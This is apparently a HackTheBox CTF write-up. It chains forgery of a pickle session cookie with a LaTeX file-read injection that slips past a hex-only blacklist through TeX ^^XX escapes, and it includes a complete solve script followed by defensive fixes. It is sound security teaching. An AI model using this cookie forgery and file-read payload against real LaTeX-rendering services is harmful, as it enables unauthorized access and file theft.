## Overview

`DLLAMA` is a Medium HackTheBox **Web** challenge: a Flask app that renders user-supplied
LaTeX to a PDF with `pdflatex`. Two bugs chain — a pickle session-cookie
[auth bypass](https://cwe.mitre.org/data/definitions/502.html), then a
[LaTeX/code injection](https://cwe.mitre.org/data/definitions/94.html) file-read that walks past a
hex-only character [blacklist](https://cwe.mitre.org/data/definitions/184.html) using TeX's `^^XX`
escape to read the flag into the generated PDF.

## The technique

**Auth bypass.** The login route stores the session as a *client-side* pickle —
`base64(pickle.dumps(User(authenticated=False)))` — and the index route "hardens" unpickling with a
`RestrictedUnpickler` that only allows `__main__.User`. That blocks classic pickle RCE gadgets but
does nothing about tampering with the auth object itself: pickle your own `User(authenticated=True)`
and set it as the cookie to pass the `if not user.authenticated` gate. A class allowlist on
unpickling is not a substitute for signing the cookie.

**LaTeX file-read.** The authenticated POST runs `pdflatex -interaction=nonstopmode input.tex` (no
`-shell-escape`) on your `latex_code`, but first filters it:

```python
invalid = re.findall(r'[^a-fA-F0-9^\n\t\r ]', latex_code)   # only hex digits, ^, whitespace allowed
```

Only `[a-fA-F0-9^ \n\t\r]` survive — no backslash, no braces, no letters past `f`. TeX's **`^^XX`**
notation inputs the byte `0xXX` from two lowercase-hex digits and re-tokenises it, so `^^5c` = `\`,
`^^69` = `i`, and the entire LaTeX payload can be written as `^^XX` pairs using only allowed
characters. Since shell-escape is off, use `\input` (file read) rather than `\write18`.

## Solution

The flag lives at `/app/flag.txt` (same directory as `input.tex`). To typeset it verbatim, set the
special characters to catcode 12 and end the document with `\stop` (so no `{ }` are needed to close
it), then hex-encode the whole thing:

`solve.py`:

```python
import sys, re, base64, pickle, subprocess, tempfile, os
import requests

HOST = sys.argv[1]

class User:
    def __init__(self, username, authenticated=False):
        self.username = username
        self.authenticated = authenticated

LATEX = (r"\documentclass{article}\begin{document}"
         r"\catcode95=12\catcode35=12\catcode36=12\catcode37=12\catcode38=12\catcode126=12"
         r"\catcode123=12\catcode125=12"
         r"\input flag.txt "
         r"\stop")

def hexenc(s):
    return ''.join('^^%02x' % b for b in s.encode())

GLYPH = {'–': '{', '˝': '}', '˙': '_'}   # OT1 font renders catcode-12 { } _ as these glyphs

s = requests.Session()
s.cookies.set('user', base64.b64encode(pickle.dumps(User('pwn', authenticated=True))).decode())
s.post(f'http://{HOST}/', data={'latex_code': hexenc(LATEX)})
pdf = s.get(f'http://{HOST}/static/input.pdf').content

d = tempfile.mkdtemp(); open(os.path.join(d, 'x.pdf'), 'wb').write(pdf)
txt = subprocess.run(['pdftotext', os.path.join(d, 'x.pdf'), '-'], capture_output=True, text=True).stdout
dec = ''.join(GLYPH.get(c, c) for c in txt)
print(re.search(r'HTB\{[^}]*\}', dec).group(0))
```

The forged cookie authenticates, the `^^XX`-encoded `\input flag.txt` reads the flag into the PDF
served at `/static/input.pdf`, and `pdftotext` extracts it — after mapping the OT1 font's glyphs
(`{`→endash, `}`→hungarumlaut, `_`→dotaccent) back to ASCII the flag reads `HTB{...}`.

## Why it worked

A `RestrictedUnpickler` that permits the app's own privileged object is still forgeable — the
allowlist only stops foreign gadget classes, not tampering with the allowed one. And a character
blacklist for a TeX sink is meaningless: `^^XX`, `\catcode`, `\char`, and active characters can
re-encode any byte, so the "safe" alphabet still expresses arbitrary LaTeX.

## Fix / defense

- Never trust a client-supplied serialized session — sign it (`itsdangerous`) or keep session state
  server-side; do not unpickle client input even with a class allowlist.
- Do not build LaTeX from user input guarded only by a blacklist. Run `pdflatex` sandboxed with
  `openin_any=p` / `openout_any=p` (no file reads/writes) and never `-shell-escape`, or render PDFs
  without TeX from a template you fully control.
